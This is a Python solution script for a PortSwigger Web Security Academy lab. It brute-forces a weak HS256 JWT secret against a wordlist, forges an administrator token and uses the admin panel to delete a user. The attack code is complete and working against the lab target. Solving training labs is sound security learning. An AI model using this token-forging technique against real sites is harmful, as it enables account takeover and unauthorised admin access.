"""
Lab 3: JWT authentication bypass via weak signing key
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key
Difficulty: Practitioner

📝 The flaw: HS256 secret is a weak/guessable string. Brute force it offline
against a wordlist, then we can sign anything.

Get a wordlist first, e.g.:
  pip install requests --break-system-packages
  curl -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/CommonCreds/10-million-password-list-top1000.txt
or PortSwigger's own jwt-secrets.txt list (search "portswigger jwt-secrets.txt").
"""

from utils import get_session, log, note, decode_jwt, brute_force_hs256_key, forge_hs256_token

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}
WORDLIST = "jwt-secrets.txt"  # one candidate secret per line


def run():
    s = get_session()

    r = s.post(f"{TARGET}/login", data=WIENER)
    token = s.cookies.get("session")
    header, payload = decode_jwt(token)

    note(f"Brute-forcing HMAC secret against {WORDLIST} — pure CPU, no requests sent.")
    key = brute_force_hs256_key(token, WORDLIST)
    if not key:
        log("No matching secret found — try a bigger/different wordlist.", ok=False)
        return
    log(f"Recovered secret: {key!r}")

    payload["sub"] = "administrator"
    forged = forge_hs256_token(header, payload, key.encode())
    s.cookies.set("session", forged)

    r = s.get(f"{TARGET}/admin")
    log(f"/admin status: {r.status_code}")
    if r.status_code == 200:
        r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
        log(f"Delete carlos responded {r.status_code}")


if __name__ == "__main__":
    run()
